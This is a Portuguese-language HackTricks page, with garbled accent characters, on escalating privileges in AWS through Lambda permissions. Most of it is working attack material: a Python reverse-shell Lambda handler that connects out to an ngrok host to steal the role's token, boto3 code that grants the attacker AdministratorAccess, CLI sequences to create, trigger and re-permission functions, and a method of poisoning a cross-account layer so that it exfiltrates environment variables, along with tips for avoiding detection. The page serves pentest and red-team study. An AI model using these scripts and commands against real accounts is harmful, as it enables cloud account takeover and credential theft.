# AWS - Lambda Privesc

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## lambda

Mais informa√ß√µes sobre lambda em:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Um usu√°rio com as permiss√µes **`iam:PassRole`, `lambda:CreateFunction`,** e **`lambda:InvokeFunction`** pode **escalar privil√©gios passando uma IAM role existente para uma nova fun√ß√£o Lambda** que inclui c√≥digo para importar a biblioteca AWS relevante para a linguagem de programa√ß√£o de sua escolha, e ent√£o us√°-la para realizar a√ß√µes de sua escolha. O c√≥digo poderia ent√£o ser executado invocando a fun√ß√£o atrav√©s da API AWS.

Um atacante poderia abusar disso para obter um **rev shell e roubar o token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Voc√™ tamb√©m pode **abusar das permiss√µes do papel lambda** a partir da pr√≥pria fun√ß√£o lambda.\
Se o papel lambda tiver permiss√µes suficientes, voc√™ poderia us√°-lo para conceder direitos de administrador a voc√™:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
**Impacto Potencial:** Privesc direto para o papel de servi√ßo lambda arbitr√°rio especificado.

{% hint style="danger" %}
Note que, embora possa parecer interessante, **`lambda:InvokeAsync`** **n√£o** permite por si s√≥ **executar `aws lambda invoke-async`**, voc√™ tamb√©m precisa de `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Como no cen√°rio anterior, voc√™ pode **conceder a si mesmo a permiss√£o `lambda:InvokeFunction`** se tiver a permiss√£o **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Impacto Potencial:** Privesc direto para o papel de servi√ßo lambda arbitr√°rio especificado.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Um usu√°rio com as permiss√µes **`iam:PassRole`, `lambda:CreateFunction` e `lambda:CreateEventSourceMapping`** (e possivelmente `dynamodb:PutItem` e `dynamodb:CreateTable`), mas **sem** a permiss√£o `lambda:InvokeFunction`, pode escalar privil√©gios **passando um papel IAM existente para uma nova fun√ß√£o Lambda** que inclui c√≥digo para importar a biblioteca AWS relevante para a linguagem de programa√ß√£o de sua escolha, e ent√£o us√°-la para realizar a√ß√µes de sua escolha. Em seguida, precisaria **criar uma tabela DynamoDB ou usar uma existente**, para **criar um mapeamento de fonte de evento para a fun√ß√£o Lambda apontando para essa tabela DynamoDB**. Depois, precisaria inserir um item na tabela ou esperar por outro m√©todo para faz√™-lo, de modo que a **fun√ß√£o Lambda seja invocada**.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Onde o **c√≥digo** no arquivo python iria **utilizar a fun√ß√£o alvo**. Um exemplo seria o mesmo script usado no m√©todo anterior.

Ap√≥s isso, o pr√≥ximo passo depende de **se o DynamoDB est√° sendo usado** no ambiente AWS atual. **Se** estiver sendo **usado**, tudo o que precisa ser feito √© **criar o mapeamento da fonte do evento** para a fun√ß√£o Lambda, mas se n√£o, ent√£o o atacante precisar√° **criar uma tabela com streaming habilitado** com o seguinte comando:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Ap√≥s este comando, o atacante iria **conectar a fun√ß√£o Lambda e a tabela DynamoDB** ao **criar um mapeamento de fonte de evento** com o seguinte comando:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Agora que a fun√ß√£o Lambda e o stream est√£o conectados, o atacante pode **invocar a fun√ß√£o Lambda acionando o stream do DynamoDB**. Isso pode ser feito inserindo um item na tabela do DynamoDB, o que acionar√° o stream, usando o seguinte comando:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
Neste ponto, a fun√ß√£o Lambda ser√° invocada, e o atacante se tornar√° um administrador da conta AWS.

**Impacto Potencial:** Privesc direto para a fun√ß√£o de servi√ßo lambda especificada.

### `lambda:AddPermission`

Um atacante com essa permiss√£o pode **conceder a si mesmo (ou a outros) quaisquer permiss√µes** (isso gera pol√≠ticas baseadas em recursos para conceder acesso ao recurso):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Impacto Potencial:** Privesc direto para a fun√ß√£o de servi√ßo lambda usada, concedendo permiss√£o para modificar o c√≥digo e execut√°-lo.

### `lambda:AddLayerVersionPermission`

Um atacante com essa permiss√£o pode **conceder a si mesmo (ou a outros) a permiss√£o `lambda:GetLayerVersion`**. Ele poderia acessar a camada e procurar por vulnerabilidades ou informa√ß√µes sens√≠veis

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Impacto Potencial:** Acesso potencial a informa√ß√µes sens√≠veis.

### `lambda:UpdateFunctionCode`

Um atacante com a permiss√£o **`lambda:UpdateFunctionCode`** poderia **atualizar o c√≥digo em uma fun√ß√£o Lambda existente com uma fun√ß√£o IAM anexada** de modo que importasse a biblioteca AWS relevante naquela linguagem de programa√ß√£o e a usasse para realizar a√ß√µes em nome dessa fun√ß√£o. Eles ent√£o precisariam **esperar que ela fosse invocada se n√£o fossem capazes de faz√™-lo diretamente**, mas se j√° existe, √© prov√°vel que haja alguma forma de que ela ser√° invocada.
```bash
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not checki if it's exposed in any URL or via an API gateway you could access
```
Onde o arquivo **.zip associado cont√©m c√≥digo que utiliza a fun√ß√£o do Lambda**. Um exemplo poderia incluir o trecho de c√≥digo dos m√©todos anteriores.

**Impacto Potencial:** Privesc direto para a fun√ß√£o de servi√ßo do lambda utilizada.

### `lambda:UpdateFunctionConfiguration`

#### Introdu√ß√£o

[**Camadas Lambda**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) permitem incluir **c√≥digo** na sua fun√ß√£o lambda, mas **armazenando-o separadamente**, para que o c√≥digo da fun√ß√£o possa permanecer pequeno e **v√°rias fun√ß√µes possam compartilhar c√≥digo**.

Dentro do lambda, voc√™ pode verificar os caminhos de onde o c√≥digo python √© carregado com uma fun√ß√£o como a seguinte:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Estes s√£o os locais:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Por exemplo, a biblioteca boto3 √© carregada de `/var/runtime/boto3` (4¬™ posi√ß√£o).

#### Explora√ß√£o

**Anexar uma camada a uma fun√ß√£o** s√≥ requer a permiss√£o `lambda:UpdateFunctionConfiguration` e **camadas podem ser compartilhadas entre contas**. Tamb√©m precisar√≠amos saber **quais bibliotecas eles est√£o usando**, para que possamos substitu√≠-las corretamente, mas neste exemplo, vamos apenas **assumir que a fun√ß√£o atacada est√° importando boto3**.

Para sermos cautelosos, vamos usar o Pip para instalar a mesma vers√£o da biblioteca boto3 do runtime do Lambda que estamos visando (Python 3.7), apenas para garantir que n√£o haja nada diferente que possa causar problemas na fun√ß√£o alvo. Atualmente, esse runtime usa a vers√£o 1.9.42 do boto3.

Com o seguinte c√≥digo, vamos instalar a vers√£o 1.9.42 do boto3 e suas depend√™ncias em uma pasta local "lambda\_layer":
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
Em seguida, abriremos o arquivo `/lambda_layer/boto3/__init__.py` e adicionaremos o c√≥digo malicioso. O payload que adicionaremos √© o seguinte:

![](<../../../.gitbook/assets/image (26).png>)

`requests` est√° sendo importado de `botocore`. A fun√ß√£o exfiltrar√° as vari√°veis de ambiente, e o bloco try-except e o timeout de 0.1 est√£o l√° para garantir que este c√≥digo n√£o quebre nada.

{% hint style="info" %}
**Nota importante:** Voc√™ n√£o deve mais usar `from botocore.vendored import requests` em pentests reais, porque um "DeprecationWarning" ser√° impresso nos logs do CloudWatch dessa fun√ß√£o, o que provavelmente far√° com que voc√™ seja detectado por um defensor.
{% endhint %}

Agora, compacte esse c√≥digo em um **arquivo ZIP** e **fa√ßa o upload** para uma **nova camada Lambda na conta do ATACANTE**. Voc√™ precisar√° criar primeiro uma pasta chamada ‚Äúpython‚Äù e colocar suas bibliotecas l√°, para que, uma vez feito o upload para o Lambda, o c√≥digo seja encontrado em ‚Äú/opt/python/boto3‚Äù. Al√©m disso, certifique-se de que a camada seja compat√≠vel com Python 3.7 e que a **camada esteja na mesma regi√£o que a nossa fun√ß√£o alvo**. Uma vez feito isso, usaremos `lambda:AddLayerVersionPermission` para **tornar a camada publicamente acess√≠vel**, para que nossa conta alvo possa us√°-la. Use suas credenciais pessoais da AWS para essa chamada de API.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Agora, com as **credenciais comprometidas** que temos, executaremos o seguinte comando na nossa fun√ß√£o Lambda alvo "s3-getter", que ir√° **anexar nossa camada Lambda cross-account**.
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
O pr√≥ximo passo seria **invocar a fun√ß√£o** n√≥s mesmos se pudermos ou esperar at√© que **seja invocada** por meios normais ‚Äì o que √© o m√©todo mais seguro.

Uma **maneira mais discreta de explorar essa vulnerabilidade** pode ser encontrada em:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Impacto Potencial:** Privesc direto para o papel de servi√ßo lambda utilizado.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Talvez com essas permiss√µes voc√™ consiga criar uma fun√ß√£o e execut√°-la chamando a URL... mas eu n√£o consegui encontrar uma maneira de testar isso, ent√£o me avise se voc√™ conseguir!

### Lambda MitM

Algumas lambdas v√£o estar **recebendo informa√ß√µes sens√≠veis dos usu√°rios nos par√¢metros.** Se conseguir RCE em uma delas, voc√™ pode exfiltrar as informa√ß√µes que outros usu√°rios est√£o enviando para ela, confira em:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Refer√™ncias

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
